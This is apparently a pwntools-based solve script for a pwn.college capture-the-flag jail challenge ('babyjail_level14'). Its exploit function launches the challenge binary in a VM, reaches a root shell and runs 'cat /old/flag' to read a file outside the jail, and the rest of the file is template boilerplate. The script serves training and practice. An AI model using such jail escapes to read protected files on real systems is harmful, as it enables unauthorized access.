# Nagib Lakhdari 3si2
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import pexpect
import pwn
import time

BINARY = "/challenge/babyjail_level14"
LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
LD = "/lib64/ld-linux-x86-64.so.2"

exe = pwn.context.binary = pwn.ELF(BINARY)
libc = pwn.ELF(LIBC)
ld = pwn.ELF(LD)
pwn.context.terminal = ["tmux", "splitw", "-h"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
p64 = pwn.p64
u64 = pwn.u64
p32 = pwn.p32
u32 = pwn.u32
p16 = pwn.p16
u16 = pwn.u16
p8  = pwn.p8
u8  = pwn.u8

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def exploit():
    child = pexpect.spawn('vm connect')

    child.expect(r'Last login:', timeout=60)
    time.sleep(5)
    child.sendline('/challenge/babyjail_level14')
    child.expect(r'bash-5.0# ', timeout=60)
    child.sendline('cat /old/flag')
    child.expect(r'pwn\.college\{.*?\}', timeout=60)
    flag = child.after.decode().strip()
    print(f'Flag: {flag}')

    child.sendline('exit')
    child.close()

if __name__ == "__main__":
    exploit()
